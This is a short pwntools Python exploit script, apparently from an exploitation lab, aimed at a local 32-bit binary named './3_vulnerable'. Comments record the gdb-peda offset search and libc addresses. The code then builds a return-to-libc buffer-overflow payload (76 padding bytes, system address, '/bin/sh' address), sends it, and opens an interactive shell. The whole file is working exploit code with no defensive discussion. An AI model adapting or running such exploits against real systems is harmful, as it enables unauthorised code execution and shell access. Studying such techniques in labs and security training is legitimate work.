#!/usr/bin/python

from pwn import *

def main():
	# Start the process
	p = process("./3_vulnerable") 

	# Print pid
	# raw_input(str(p.proc.pid)) 

	# Craft payload

	'''
	0x41344141 in ?? ()
	gdb-peda$ pattern_offset 0x41344141
	1093943617 found at offset: 76
	'''
	# ret = 0xdeadbeef
	# payload = 'A' * 76 + p32(ret) 

	'''
	0xf7e15000 0xf7fc5000 r-xp      /lib/i386-linux-gnu/libc-2.23.so

	offset_system = 0x0003ada0
	offset_dup2 = 0x000d6310
	offset_read = 0x000d5b00
	offset_write = 0x000d5b70
	offset_str_bin_sh = 0x15ba0b
	'''
	# Calculate address of SystemCall and /bin/sh
	system = p32(0xf7e15000 + 0x0003ada0)
	bin_sh = p32(0xf7e15000 + 0x15ba0b)
	nop = '\x90' * 4

	payload = 'A' * 76 + system + nop + bin_sh	
	
	# Send the payload 
	p.send(payload)

	# Pass interaction back to user
	p.interactive() 

if __name__ == "__main__":
	main()
